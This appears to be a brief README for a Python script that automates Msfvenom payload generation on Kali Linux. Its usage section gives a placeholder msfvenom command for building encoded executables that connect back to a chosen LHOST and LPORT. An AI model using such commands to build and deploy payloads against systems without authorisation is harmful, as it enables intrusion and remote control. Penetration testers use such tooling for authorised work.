# Payload_Generation_Automation_tool
This script automate payload generation process using Msfvenom exploit tool

# Requirement
Os: kalilinux
Programming language : Python3
Env: VM workstation

# Usage
msfvenom -p win_list -a <architecture(x86 or x64)> -e <enocoders> LHOST=<local_ip> LPORT=<local_port> -f <exe or elf or macho >
